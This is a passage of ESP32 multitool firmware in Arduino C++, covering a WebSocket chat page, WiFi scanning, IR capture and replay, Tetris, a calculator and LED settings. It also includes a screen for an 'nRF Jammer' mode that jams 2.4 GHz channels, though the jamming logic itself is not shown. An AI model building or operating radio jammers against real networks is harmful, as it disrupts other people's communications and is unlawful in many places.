.message.esp{flex-direction:row-reverse}
.avatar{width:36px;height:36px;border-radius:50%;background:#5a5a7a;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px}
.message.esp .avatar{background:#4c9aff}
.bubble{max-width:70%;padding:10px 14px;border-radius:18px;background:#3e3e55;color:#fff;word-wrap:break-word;font-size:14px;line-height:1.4}
.message.esp .bubble{background:#4c9aff;color:white}
.input-area{display:flex;padding:12px;background:#2a2a38;border-top:1px solid #4a4a60;gap:10px}
#msg{flex:1;padding:12px;border:none;border-radius:30px;background:#3a3a4e;color:white;font-size:14px;outline:none}
#msg::placeholder{color:#aaa}
button{padding:12px 24px;border:none;border-radius:30px;background:#4c9aff;color:white;font-weight:bold;cursor:pointer;transition:0.2s}
button:hover{background:#3a7fcc}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
</style>
</head>
<body>
<div class="chat-container">
<div class="header">💬 ESP32 Chat</div>
<div class="messages" id="chat"></div>
<div class="input-area">
<input type="text" id="msg" placeholder="Напишите сообщение..." autocomplete="off">
<button onclick="sendMsg()">➤ Отправить</button>
</div>
</div>
<script>
let socket, reconnectTimer;
function addMessage(sender, text) {
const chatDiv=document.getElementById('chat');
const messageDiv=document.createElement('div');
messageDiv.className='message '+(sender==='esp'?'esp':'site');
const avatar=document.createElement('div');
avatar.className='avatar';
avatar.textContent=sender==='esp'?'🤖':'🌐';
const bubble=document.createElement('div');
bubble.className='bubble';
bubble.textContent=text;
messageDiv.appendChild(avatar);
messageDiv.appendChild(bubble);
chatDiv.appendChild(messageDiv);
chatDiv.scrollTop=chatDiv.scrollHeight;
}
function connect(){
socket=new WebSocket("ws://"+window.location.hostname+":81/");
socket.onopen=()=>{addMessage('site','✅ Соединение установлено');if(reconnectTimer)clearTimeout(reconnectTimer);};
socket.onmessage=(event)=>{addMessage('esp',event.data);};
socket.onclose=()=>{addMessage('site','❌ Соединение потеряно, переподключение...');reconnectTimer=setTimeout(connect,1000);};
socket.onerror=()=>{addMessage('site','⚠️ Ошибка соединения');};
}
function sendMsg(){
const input=document.getElementById('msg');
const text=input.value.trim();
if(text&&socket&&socket.readyState===WebSocket.OPEN){
socket.send(text);
addMessage('site',text);
input.value='';
}
}
document.getElementById('msg').addEventListener('keypress',(e)=>{if(e.key==='Enter')sendMsg();});
connect();
</script>
</body>
</html>
)rawliteral";

void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
  switch(type) {
    case WStype_CONNECTED:
      webSocketConnected = true;
      if (appState == STATE_WIFI_CHAT) {
        chatKeyboardActive = true;
        selectedKey = 0;
        capsLock = false;
        chatMessage = "";
        needRedraw = true;
      }
      Serial.println("WebSocket client connected");
      break;
    case WStype_DISCONNECTED:
      webSocketConnected = false;
      Serial.println("WebSocket disconnected");
      if (appState == STATE_WIFI_CHAT) {
        chatKeyboardActive = false;
        needRedraw = true;
        showMsg("WebSocket lost");
      }
      break;
    case WStype_TEXT: {
      String msg = String((char*)payload);
      lastIncomingMsg = msg;
      addChatMessage("> " + msg);
      needRedraw = true;
      Serial.print("Chat RX: ");
      Serial.println(msg);
      break;
    }
    default: break;
  }
}
void startWiFiChat() {
  if (!chatActive) {
    server.on("/", []() { server.send(200, "text/html", CHAT_PAGE); });
    webSocket.begin();
    webSocket.onEvent(webSocketEvent);
    server.begin();
    chatActive = true;
    Serial.println("Chat server started");
  }
}
void stopWiFiChat() {
  if (chatActive) {
    server.stop();
    webSocket.close();
    chatActive = false;
    Serial.println("Chat server stopped");
  }
}

void drawWifiScan() {
  display.clearDisplay();
  drawHeader("WiFi Scan");
  if (wifiScanning) {
    display.setCursor(40, 30);
    display.println("Scanning...");
  } else if (wifiList.empty()) {
    display.setCursor(30, 30);
    display.println("No networks");
  } else {
    int visible = 4;
    if (wifiSelectedIdx < wifiScrollOffset) wifiScrollOffset = wifiSelectedIdx;
    if (wifiSelectedIdx >= wifiScrollOffset + visible) wifiScrollOffset = wifiSelectedIdx - visible + 1;
    if (wifiScrollOffset < 0) wifiScrollOffset = 0;
    if (wifiScrollOffset + visible > (int)wifiList.size()) wifiScrollOffset = wifiList.size() - visible;
    for (int i = 0; i < visible && wifiScrollOffset + i < (int)wifiList.size(); i++) {
      int idx = wifiScrollOffset + i;
      int y = 14 + i * 12;
      if (wifiSelectedIdx == idx) {
        display.fillRect(0, y - 1, SCREEN_WIDTH, 11, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
        display.setCursor(2, y);
        display.print(">");
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      String ssid = wifiList[idx].ssid;
      int rssi = wifiList[idx].rssi;
      String rssiStr = " " + String(rssi);
      const int maxLen = 15;
      display.setCursor(12, y);
      if (ssid.length() <= maxLen || wifiSelectedIdx != idx) {
        if (ssid.length() > maxLen) ssid = ssid.substring(0, maxLen);
        display.print(ssid + rssiStr);
      } else {
        if (millis() - wifiScanLastScrollTime > 15) {
          wifiScanScrollOffset++;
          if (wifiScanScrollOffset > ssid.length() + 3) wifiScanScrollOffset = 0;
          wifiScanLastScrollTime = millis();
        }
        String loopText = ssid.substring(wifiScanScrollOffset) + " " + ssid.substring(0, wifiScanScrollOffset);
        if (loopText.length() > maxLen) loopText = loopText.substring(0, maxLen);
        display.print(loopText + rssiStr);
      }
    }
    int yb = 14 + visible * 12;
    if (wifiSelectedIdx == -1) {
      display.fillRect(0, yb - 1, SCREEN_WIDTH, 11, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(2, yb);
      display.print(">");
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(12, yb);
    display.println("Back");
  }
  drawTopBarIcons();
  display.display();
}
void drawNrfSpectrum() {
  display.clearDisplay();
  drawHeader("nRF Spectrum");

  if (!nrfOk) {
    display.setCursor(10, 30);
    display.println("nRF24 not found!");
    drawTopBarIcons();
    display.display();
    return;
  }

  display.setCursor(2, 14);
  display.print("CH:" + String(currentNrfChan) + "  " + String(2400 + currentNrfChan) + "MHz");
  display.setCursor(90, 14);
  display.print("SIG:" + String(nrfSmooth[currentNrfChan]));

  const int graphTop = 24;
  const int graphBottom = 63;
  for (int x = 0; x < 128; x++) {
    int h = nrf_spectrum_history[x];
    if (h > 40) h = 40;
    if (h > 0) {
      display.drawFastVLine(x, graphBottom - h, h, SSD1306_WHITE);
    }
  }

  drawTopBarIcons();
  display.display();
}
void drawNrfJammer() {
  display.clearDisplay();
  if (!nrfOk) {
    drawHeader("nRF24 Error");
    display.setCursor(10, 30);
    display.println(nrfErrorMsg);
    drawTopBarIcons();
    display.display();
    return;
  }
  drawHeader("nRF Jammer");
  if (jamming) {
    display.setTextSize(2);
    display.setCursor(20, 20);
    display.println("JAMMING");
    display.setTextSize(1);
    display.setCursor(2, 40);
    display.print("Ch:" + String(currentNrfChan) + "  " + String(2400 + currentNrfChan) + "MHz");
    display.setCursor(2, 52);
    display.println("Hold OK to stop");
  } else {
    display.setCursor(15, 30);
    display.print("nRF24: READY");
    display.setCursor(15, 45);
    display.print("Press start");
    display.setCursor(2, 60);
    display.print("Hold OK=exit");
  }
  drawTopBarIcons();
  display.display();
}
void drawIrCapture() {
    display.clearDisplay();
    drawHeader("IR Capture");
    if (irCapturing) {
        if (irTempReady) {
            display.setCursor(10, 20);
            display.print("Captured!");
            display.setCursor(10, 30);
            display.print("Proto: " + tempProto);
            display.setCursor(10, 40);
            display.print("Len: " + String(tempRawLen));
        } else {
            display.setCursor(20, 30);
            display.println("Listening...");
            display.setCursor(15, 42);
            display.print("Timeout: " + String((irTimeout - millis()) / 1000) + "s");
        }
    } else {
        display.setCursor(30, 30);
        display.println("Press start");
    }
    display.setCursor(2, 56);
    display.println("OK=save, BACK=cancel");
    drawTopBarIcons();
    display.display();
}
void drawIrTransmit() {
  display.clearDisplay();
  drawHeader("IR Transmit");
  for (int i = 0; i < IR_SLOTS_COUNT; i++) {
    int y = 14 + i * 10;
    if (i == irTxScroll) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(2, y);
      display.print(">");
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(12, y);
    display.print("Slot " + String(i) + ": " + (irSlots[i].isValid ? "OK" : "Empty"));
  }
  int yb = 14 + IR_SLOTS_COUNT * 10;
  if (irTxScroll == IR_SLOTS_COUNT) {
    display.fillRect(0, yb - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(2, yb);
    display.print(">");
  } else {
    display.setTextColor(SSD1306_WHITE);
  }
  display.setCursor(12, yb);
  display.println("Back");
  drawTopBarIcons();
  display.display();
}
void drawTimeoutMenu() {
  display.clearDisplay();
  drawHeader("Display Timeout");
  const char* opts[] = {"Off", "10s", "30s", "1min", "2min", "5min", "10min", "30min"};
  int vals[] = {0, 10, 30, 60, 120, 300, 600, 1800};
  int idx = 0;
  for (int i = 0; i < 8; i++) if (vals[i] == timeoutVal) idx = i;
  display.setCursor(30, 30);
  display.print("Timeout: " + String(opts[idx]));
  display.setCursor(2, 56);
  display.println("UP/DOWN=chg  OK=save");
  drawTopBarIcons();
  display.display();
}
void drawResetConfirm() {
  display.clearDisplay();
  drawHeader("Reset Device!");
  display.setCursor(15, 25);
  display.println("Reset ALL?");
  display.setCursor(15, 37);
  display.println("UP=YES  DOWN=NO");
  drawTopBarIcons();
  display.display();
}
void drawRebootConfirm() {
  display.clearDisplay();
  drawHeader("Reboot");
  display.setCursor(15, 30);
  display.println("Reboot?");
  display.setCursor(15, 42);
  display.println("UP=YES  DOWN=NO");
  drawTopBarIcons();
  display.display();
}
void drawChatKeyboard() {
  display.clearDisplay();
  display.drawRect(0, 0, 128, 10, WHITE);
  display.setCursor(2, 2);
  String visible = chatMessage;
  if (visible.length() > 18) visible = visible.substring(visible.length() - 18);
  display.print(visible);
  for (int row = 0; row < rowsKeyboard; row++) {
    for (int col = 0; col < colsKeyboard; col++) {
      int index = row * colsKeyboard + col;
      if (index >= totalKeys) break;
      int x = col * 16;
      int y = 13 + row * 9;
      if (index == selectedKey) {
        display.fillRect(x, y, 15, 8, WHITE);
        display.setTextColor(BLACK);
      } else {
        display.setTextColor(WHITE);
      }
      String key = capsLock ? upperKeys[index] : lowerKeys[index];
      if (key.length() > 0) {
        display.setCursor(x + 1, y + 1);
        if (key.length() == 1) {
          display.write(key[0]);
        } else {
          display.print(key);
        }
      }
    }
  }
  display.display();
}
void updateTimeout(Button btn) {
  const int vals[] = {0, 10, 30, 60, 120, 300, 600, 1800};
  const int sz = 8;
  int idx = 0;
  for (int i = 0; i < sz; i++) if (vals[i] == timeoutVal) idx = i;
  if (btn == BTN_UP) idx = (idx - 1 + sz) % sz;
  else if (btn == BTN_DOWN) idx = (idx + 1) % sz;
  else if (btn == BTN_OK) {
    displayTimeoutSec = timeoutVal = vals[idx];
    saveTimeout();
    appState = STATE_SETTINGS_MENU;
    needRedraw = true;
    return;
  }
  timeoutVal = vals[idx];
  needRedraw = true;
}
void drawKeyboard() {
  display.clearDisplay();
  display.drawRect(0, 0, 128, 10, WHITE);
  display.setCursor(2, 2);
  String visible = consoleText;
  if (visible.length() > 18) visible = visible.substring(visible.length() - 18);
  display.print(visible);
  for (int row = 0; row < rowsKeyboard; row++) {
    for (int col = 0; col < colsKeyboard; col++) {
      int index = row * colsKeyboard + col;
      if (index >= totalKeys) break;
      int x = col * 16;
      int y = 13 + row * 9;
      if (index == selectedKey) {
        display.fillRect(x, y, 15, 8, WHITE);
        display.setTextColor(BLACK);
      } else {
        display.setTextColor(WHITE);
      }
      String key = capsLock ? upperKeys[index] : lowerKeys[index];
      if (key.length() > 0) {
        display.setCursor(x + 1, y + 1);
        display.print(key);
      }
    }
  }
  drawTopBarIcons();
  display.display();
}

void drawBatteryIcon(int x, int y) {
  int width = 16;
  int height = 8;
int percent = (batteryRemaining / batteryCapacity) * 100;
if (percent > 100) percent = 100;
if (percent < 0) percent = 0;
  display.setTextSize(1);
  String percentStr = String(percent) + "%";
  int16_t x1, y1;
  uint16_t w, h;
  display.getTextBounds(percentStr, 0, 0, &x1, &y1, &w, &h);
  int percentX = x - w - 2;
  int percentY = y + (height - h) / 2;
  display.setCursor(percentX, percentY);
  display.print(percentStr);
  display.drawRect(x, y, width, height, SSD1306_WHITE);
  display.fillRect(x + width, y + 2, 2, height - 4, SSD1306_WHITE);
  int fillWidth = map(percent, 0, 100, 0, width - 2);
  if (fillWidth > 0) {
    display.fillRect(x + 1, y + 1, fillWidth, height - 2, SSD1306_WHITE);
  }
}
void drawTopBarIcons() {
  int y = 2;
  int x = SCREEN_WIDTH;

  auto textWidth = [](const char* txt) {
    int16_t x1, y1;
    uint16_t w, h;
    display.getTextBounds(txt, 0, 0, &x1, &y1, &w, &h);
    return w;
  };

  bool hasWifi = (WiFi.status() == WL_CONNECTED);
  if (hasWifi) {
    x -= 16;
    drawWiFiIcon(x, y);
    x -= 10;
  }

  x -= 16;
  int batX = x;
  int batY = y;
  display.drawRect(batX, batY, 16, 8, SSD1306_WHITE);
  display.fillRect(batX + 16, batY + 2, 2, 4, SSD1306_WHITE);
  int percent = (batteryRemaining / batteryCapacity) * 100;
  if (percent > 100) percent = 100;
  if (percent < 0) percent = 0;
  int fillWidth = map(percent, 0, 100, 0, 14);
  if (fillWidth > 0) {
    display.fillRect(batX + 1, batY + 1, fillWidth, 6, SSD1306_WHITE);
  }

  x -= 3;

  String percentStr = String(percent) + "%";
  int16_t x1, y1;
  uint16_t w, h;
  display.getTextBounds(percentStr, 0, 0, &x1, &y1, &w, &h);
  x -= w;
  display.setCursor(x, y);
  display.print(percentStr);

  x -= 3;

bool hasCharge = isCharging;
if (hasCharge) { 
  int boltX = x - 8;
  int boltY = y;

  display.drawLine(boltX + 4, boltY + 0, boltX + 1, boltY + 4, SSD1306_WHITE);
  display.drawLine(boltX + 1, boltY + 4, boltX + 3, boltY + 4, SSD1306_WHITE);
  display.drawLine(boltX + 3, boltY + 4, boltX + 2, boltY + 8, SSD1306_WHITE);
  display.drawLine(boltX + 2, boltY + 8, boltX + 7, boltY + 3, SSD1306_WHITE);
  display.drawLine(boltX + 7, boltY + 3, boltX + 5, boltY + 3, SSD1306_WHITE);
  display.drawLine(boltX + 5, boltY + 3, boltX + 4, boltY + 0, SSD1306_WHITE);
}
}
void drawWifiSpectrum() {
  display.clearDisplay();
  drawHeader("WiFi Spectrum");
  int maxV = 5;
  for (int ch = 1; ch <= WIFI_CHANNELS; ch++) if (wifiSmooth[ch] > maxV) maxV = wifiSmooth[ch];
  if (maxV < 5) maxV = 5;
  for (int ch = 1; ch <= WIFI_CHANNELS; ch++) {
    int x = map(ch, 1, WIFI_CHANNELS, 2, SCREEN_WIDTH - 2);
    int h = map(wifiSmooth[ch], 0, maxV, 0, 35);
    if (h > 0) display.drawLine(x, 48 - h, x, 48, SSD1306_WHITE);
  }
  display.drawLine(0, 48, SCREEN_WIDTH, 48, SSD1306_WHITE);
  display.setCursor(2, 52);
  display.print("Ch:" + String(currentWifiChan));
  display.setCursor(70, 52);
  display.print("Pkt:" + String(totalPackets));
  drawTopBarIcons();
  display.display();
}
void drawWifiInfo() {
  display.clearDisplay();
  drawHeader("Net Info");
  if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size()) {
    WiFiNetworkInfo& n = wifiList[wifiSelectedIdx];
    display.setCursor(2, 14);
    display.print("SSID: " + n.ssid.substring(0, 13));
    display.setCursor(2, 24);
    display.print("Ch: " + String(n.channel));
    display.setCursor(2, 34);
    display.print("RSSI: " + String(n.rssi) + " dBm");
    display.setCursor(2, 44);
    display.print("Sec: " + n.encryptionType);
  }
  display.setCursor(2, 56);
  display.print("Press=back");
  drawTopBarIcons();
  display.display();
}
void drawWifiConnecting() {
  display.clearDisplay();
  drawHeader("Connect WiFi");
  int16_t x1, y1;
  uint16_t w, h;
  display.getTextBounds(connectSsid, 0, 0, &x1, &y1, &w, &h);
  const int maxPixels = 120;
  display.setCursor(5, 20);
  display.print("SSID: ");
  if (w <= maxPixels) {
    display.print(connectSsid);
  } else {
    if (millis() - wifiConnectLastScrollTime > 15) {
      wifiConnectScrollOffset++;
      if (wifiConnectScrollOffset > w + 25) wifiConnectScrollOffset = 0;
      wifiConnectLastScrollTime = millis();
    }
    String loopText = connectSsid + "   " + connectSsid;
    display.setCursor(5 + 40 - wifiConnectScrollOffset, 20);
    display.print(loopText);
  }
  display.setCursor(5, 35);
  display.print("Status: ");
  if (WiFi.status() == WL_CONNECTED) {
    display.print("Connected!");
    display.setCursor(5, 50);
    display.print("IP: ");
    display.print(WiFi.localIP());
  } else {
    display.print("Connecting...");
    int dots = (millis() / 500) % 4;
    for (int d = 0; d < dots; d++) display.print(".");
  }
  display.setCursor(5, 58);
  display.print("OK=back");
  drawTopBarIcons();
  display.display();
}
void drawFactoryResetConfirm() {
  display.clearDisplay();
  drawHeader("FACTORY RESET");
  display.setCursor(15, 25);
  display.println("Clear ALL settings?");
  display.setCursor(15, 37);
  display.println("UP=YES  DOWN=NO");
  drawTopBarIcons();
  display.display();
}
void drawStorageInfo() {
  display.clearDisplay();
  drawHeader("Storage");
  int y = 14;
  display.setCursor(2, y); y += 10;
  display.print("Flash: " + String(ESP.getFlashChipSize() / (1024*1024)) + " MB");
  display.setCursor(2, y); y += 10;
  display.print("Free Heap: " + String(ESP.getFreeHeap() / 1024) + " KB");
  display.setCursor(2, y); y += 10;
  if (SD.begin(SD_CS_PIN, SPI, 4000000)) {
    uint64_t cardSize = SD.cardSize() / (1024*1024);
    uint64_t used = SD.usedBytes() / (1024*1024);
    uint64_t total = SD.totalBytes() / (1024*1024);
    display.print("SD Card: " + String(cardSize) + " MB");
    display.setCursor(2, y); y += 10;
    display.print("Used: " + String(used) + " MB");
    display.setCursor(2, y); y += 10;
    display.print("Free: " + String(total - used) + " MB");
    SD.end();
  } else {
    display.println("SD Card: ERROR");
  }
  display.setCursor(2, 58);
  display.print("Press OK=back");
  drawTopBarIcons();
  display.display();
}
void drawTetrisGame() {
  display.clearDisplay();
  drawHeader("Tetris");

  if (tetrisGameOver) {
    display.setCursor(30, 30);
    display.print("Game Over");
    display.setCursor(20, 45);
    display.print("Score: ");
    display.print(tetrisScore);
    display.setCursor(10, 55);
    display.print("OK=restart, Up/Down=exit");
    drawTopBarIcons();
    display.display();
    if (btnOk()) {
      memset(tetrisField, 0, sizeof(tetrisField));
      tetrisScore = 0;
      tetrisLines = 0;
      tetrisGameOver = false;
      spawnPiece();
      needRedraw = true;
    }
    if (btnUp() || btnDown()) {
      appState = STATE_APPS_MENU;
      needRedraw = true;
    }
    return;
  }

  // === Управление ===
  // Движение влево/вправо с автоповтором
  static unsigned long lastMoveTime = 0;
  static bool moveHeld = false;
  static int moveDir = 0; // -1 влево, 1 вправо

  if (btnUp()) {
    if (!moveHeld) {
      moveHeld = true;
      moveDir = -1;
      lastMoveTime = millis();
      int newX = currentPiece.x - 1;
      if (!collision(currentPiece.type, currentPiece.rotation, newX, currentPiece.y)) {
        currentPiece.x = newX;
        needRedraw = true;
      }
    } else if (millis() - lastMoveTime > 150) {
      lastMoveTime = millis();
      int newX = currentPiece.x - 1;
      if (!collision(currentPiece.type, currentPiece.rotation, newX, currentPiece.y)) {
        currentPiece.x = newX;
        needRedraw = true;
      }
    }
  } else if (btnDown()) {
    if (!moveHeld) {
      moveHeld = true;
      moveDir = 1;
      lastMoveTime = millis();
      int newX = currentPiece.x + 1;
      if (!collision(currentPiece.type, currentPiece.rotation, newX, currentPiece.y)) {
        currentPiece.x = newX;
        needRedraw = true;
      }
    } else if (millis() - lastMoveTime > 150) {
      lastMoveTime = millis();
      int newX = currentPiece.x + 1;
      if (!collision(currentPiece.type, currentPiece.rotation, newX, currentPiece.y)) {
        currentPiece.x = newX;
        needRedraw = true;
      }
    }
  } else {
    moveHeld = false;
  }

  // Обработка OK: поворот, ускорение, выход по длительному нажатию
  static unsigned long okHoldStart = 0;
  static bool okHeld = false;

  if (btnOk()) {
    if (!okHeld) {
      okHeld = true;
      okHoldStart = millis();
      // Поворот
      int newRot = (currentPiece.rotation + 1) % 4;
      if (!collision(currentPiece.type, newRot, currentPiece.x, currentPiece.y)) {
        currentPiece.rotation = newRot;
        needRedraw = true;
      }
    } else {
      // Удержание: ускоренное падение (после 200 мс)
      if (millis() - okHoldStart > 200) {
        if (!collision(currentPiece.type, currentPiece.rotation, currentPiece.x, currentPiece.y + 1)) {
          currentPiece.y++;
          needRedraw = true;
        }
      }
      // Выход при удержании 2 секунды
      if (millis() - okHoldStart > 2000) {
        appState = STATE_APPS_MENU;
        needRedraw = true;
        okHeld = false;
        return;
      }
    }
  } else {
    okHeld = false;
  }

  // Падение по таймеру
  if (millis() - tetrisLastDrop > tetrisDropInterval) {
    tetrisLastDrop = millis();
    if (!collision(currentPiece.type, currentPiece.rotation, currentPiece.x, currentPiece.y + 1)) {
      currentPiece.y++;
      needRedraw = true;
    } else {
      lockPiece();
      clearLines();
      spawnPiece();
      if (collision(currentPiece.type, currentPiece.rotation, currentPiece.x, currentPiece.y)) {
        tetrisGameOver = true;
        needRedraw = true;
      }
      needRedraw = true;
    }
  }

  // Отрисовка поля
  for (int row = 0; row < TETRIS_HEIGHT; row++) {
    for (int col = 0; col < TETRIS_WIDTH; col++) {
      if (tetrisField[row][col]) {
        display.fillRect(col * 4 + 10, row * 3 + 14, 4, 3, SSD1306_WHITE);
      }
    }
  }
  drawPiece(currentPiece.type, currentPiece.rotation, currentPiece.x, currentPiece.y);
  display.setCursor(2, 14);
  display.print("Score: ");
  display.print(tetrisScore);
  drawTopBarIcons();
  display.display();
}
void drawCalculator() {
  display.clearDisplay();
  display.drawRect(0, 0, 128, 10, WHITE);
  display.setCursor(2, 2);
  // отображение выражения и результата
  String displayText = calcExpression;
  if (calcResult != "") displayText += " = " + calcResult;
  if (displayText.length() > 20) displayText = displayText.substring(displayText.length()-20);
  display.print(displayText);

  int cols = 5;
  int rows = 4; // плюс строка для Exit? можно сделать 5 строк
  // расположим клавиши в 4 строки по 5, последняя строка - только Exit? 
  // У нас 21 клавиша: 4 строки по 5 = 20, и Exit отдельно. Можно сделать 5 строк: 4 строки по 5, пятая строка с Exit и пустыми.
  // Но для упрощения сделаем 5 столбцов и 5 строк (последняя строка: только Exit, остальные пустые).
  int keyW = 24, keyH = 10;
  int startX = 2, startY = 14;
  int spacing = 2;
  for (int row = 0; row < 5; row++) {
    for (int col = 0; col < 5; col++) {
      int idx = row * 5 + col;
      if (idx >= calcKeysCount) break;
      int x = startX + col * (keyW + spacing);
      int y = startY + row * (keyH + spacing);
      if (idx == calcSelectedKey) {
        display.fillRect(x, y, keyW, keyH, WHITE);
        display.setTextColor(BLACK);
      } else {
        display.setTextColor(WHITE);
      }
      display.setCursor(x + 4, y + 2);
      display.print(calcKeyLabels[idx]);
    }
  }

  drawTopBarIcons();
  display.display();
}

void saveLedSettings() {
    Preferences pref;
    pref.begin("led", false);
    pref.putInt("board_color", led_board_colorIdx);
    pref.putInt("board_bright", led_board_brightness);
    pref.putInt("board_effect", led_board_effect);
    pref.putInt("board_timeout", led_board_timeout);
    pref.putInt("key_color", led_keyboard_colorIdx);
    pref.putInt("key_bright", led_keyboard_brightness);
    pref.putInt("key_effect", led_keyboard_effect);
    pref.putInt("key_timeout", led_keyboard_timeout);
    pref.end();
}
void loadLedSettings() {
    Preferences pref;
    pref.begin("led", true);
    led_board_colorIdx = pref.getInt("board_color", 0);
    led_board_brightness = pref.getInt("board_bright", 50);
    led_board_effect = pref.getInt("board_effect", 0);
    led_board_timeout = pref.getInt("board_timeout", 0);
    led_keyboard_colorIdx = pref.getInt("key_color", 0);
    led_keyboard_brightness = pref.getInt("key_bright", 50);
    led_keyboard_effect = pref.getInt("key_effect", 0);
    led_keyboard_timeout = pref.getInt("key_timeout", 0);
    pref.end();
}

void drawLedSelectDevice() {
    display.clearDisplay();
    drawHeader("LED Device");
    const char* items[] = {"Board LED", "Keyboard LED", "Back"};
    for (int i = 0; i < 3; i++) {
        drawItem(items[i], i == led_submenu_idx, i);
    }
    drawTopBarIcons();
    display.display();
}
void drawLedMainMenu() {
    display.clearDisplay();
    char title[20];
    sprintf(title, "%s LED", led_selected_device ? "Keyboard" : "Board");
    drawHeader(title);
    const char* items[] = {"Color", "Effect", "Brightness", "Timeout", "Back"};
    for (int i = 0; i < 5; i++) {
        drawItem(items[i], i == led_submenu_idx, i);
    }
    drawTopBarIcons();
    display.display();
}
void drawLedColorMenu() {
    display.clearDisplay();
    drawHeader("Select Color");
    int colorIdx = led_selected_device ? led_keyboard_colorIdx : led_board_colorIdx;
    int brightness = led_selected_device ? led_keyboard_brightness : led_board_brightness;

    uint32_t col = colorPalette[colorIdx];
    display.fillRect(100, 2, 26, 10, SSD1306_BLACK);
    display.fillRect(100, 2, 26, 10, col);

    int visible = 4;
    int total = numColors;
    int offset = 0;
    if (colorIdx >= visible) offset = colorIdx - visible + 1;
    if (offset < 0) offset = 0;
    if (offset + visible > total) offset = total - visible;
    if (offset < 0) offset = 0;

    for (int i = 0; i < visible; i++) {
        int idx = offset + i;
        if (idx >= total) break;
        char label[10];
        sprintf(label, "%d", idx + 1);
        int y = 16 + i * 11;
        if (idx == colorIdx) {
            display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
            display.setTextColor(SSD1306_BLACK);
            display.setCursor(4, y);
            display.print(">");
        } else {
            display.setTextColor(SSD1306_WHITE);
        }
        display.setCursor(14, y);
        display.print(label);
        display.fillRect(50, y, 10, 8, colorPalette[idx]);
    }

    display.setCursor(2, 56);
    if (offset > 0) display.print("▲ ");
    else display.print("  ");
    display.print(offset + 1);
    display.print("/");
    display.print(total);
    if (offset + visible < total) display.print(" ▼");
    else display.print("  ");

    drawTopBarIcons();
    display.display();
}
void drawLedEffectMenu() {
    display.clearDisplay();
    drawHeader("Select Effect");
    int effectIdx = led_selected_device ? led_keyboard_effect : led_board_effect;
    int total = numEffects;
    int visible = 4;
    int offset = 0;
    if (effectIdx >= visible) offset = effectIdx - visible + 1;
    if (offset < 0) offset = 0;
    if (offset + visible > total) offset = total - visible;
    if (offset < 0) offset = 0;

    for (int i = 0; i < visible; i++) {
        int idx = offset + i;
        if (idx >= total) break;
        int y = 16 + i * 11;
        if (idx == effectIdx) {
            display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
            display.setTextColor(SSD1306_BLACK);
            display.setCursor(4, y);
            display.print(">");
        } else {
            display.setTextColor(SSD1306_WHITE);
        }
        display.setCursor(14, y);
        display.print(effectNames[idx]);
    }

    display.setCursor(2, 56);
    if (offset > 0) display.print("▲ ");
    else display.print("  ");
    display.print(offset + 1);
    display.print("/");
    display.print(total);
    if (offset + visible < total) display.print(" ▼");
    else display.print("  ");

    drawTopBarIcons();
    display.display();
}
void drawLedBrightnessMenu() {
    display.clearDisplay();
    drawHeader("Brightness");
    int brightness = led_selected_device ? led_keyboard_brightness : led_board_brightness;
    display.setCursor(10, 25);
    display.print("Brightness: ");
    display.print(brightness);
    display.print("%");

    display.drawRect(10, 40, 108, 8, SSD1306_WHITE);
    display.fillRect(10, 40, map(brightness, 0, 100, 0, 108), 8, SSD1306_WHITE);

    display.setCursor(2, 56);
    display.print("UP/DOWN=Change  OK=Save");
    drawTopBarIcons();
    display.display();
}
void drawLedTimeoutMenu() {
    display.clearDisplay();
    drawHeader("Timeout");
    int timeout = led_selected_device ? led_keyboard_timeout : led_board_timeout;
    display.setCursor(10, 25);
    display.print("Timeout: ");
    if (timeout == 0) display.print("Always");
    else {
        display.print(timeout);
        display.print(" sec");
    }
    display.setCursor(2, 56);
    display.print("UP/DOWN=Change  OK=Save");
    drawTopBarIcons();
    display.display();
}

void updateLedBoard() {
    static unsigned long lastUpdate = 0;
    static unsigned long lastEffectTime = 0;
    static int cube1Pos = 0, cube2Pos = 7;
    static int cubeDir1 = 1, cubeDir2 = -1;
    static int chaseStep = 0;
    static bool strobeState = false;
    static int hueOffset = 0;

    if (led_board_timeout > 0 && (millis() - lastLedActivity) > (led_board_timeout * 1000UL)) {
        led_board.clear();
        led_board.show();
        return;
    }

    if (millis() - lastUpdate < 30) return;
    lastUpdate = millis();

    uint32_t baseColor = 0;
    if (led_board_colorIdx > 0 && led_board_colorIdx < numColors) {
        baseColor = colorPalette[led_board_colorIdx];
    } else {
        baseColor = colorPalette[0];
    }

    uint8_t r = (baseColor >> 16) & 0xFF;
    uint8_t g = (baseColor >> 8) & 0xFF;
    uint8_t b = baseColor & 0xFF;
    float bright = (float)led_board_brightness / 100.0;

    switch (led_board_effect) {
        case 0:
            for (int i = 0; i < 8; i++) {
                led_board.setPixelColor(i, led_board.Color(r * bright, g * bright, b * bright));
            }
            led_board.show();
            break;

        case 1:
        {
            float breath = 0.5 + 0.5 * sin(millis() * 0.003);
            uint8_t bri = breath * led_board_brightness;
            for (int i = 0; i < 8; i++) {
                led_board.setPixelColor(i, led_board.Color(
                    r * bri / 100,
                    g * bri / 100,
                    b * bri / 100
                ));
            }
            led_board.show();
            break;
        }

        case 2:
        {
            hueOffset = (hueOffset + 1) % 360;
            for (int i = 0; i < 8; i++) {
                int hue = (hueOffset + i * 360 / 8) % 360;
                uint32_t col = led_board.ColorHSV(hue * 182, 255, led_board_brightness * 255 / 100);
                led_board.setPixelColor(i, col);
            }
            led_board.show();
            break;
        }

        case 3:
        {
            if (millis() - lastEffectTime > 40) {
                lastEffectTime = millis();
                cube1Pos += cubeDir1;
                cube2Pos += cubeDir2;
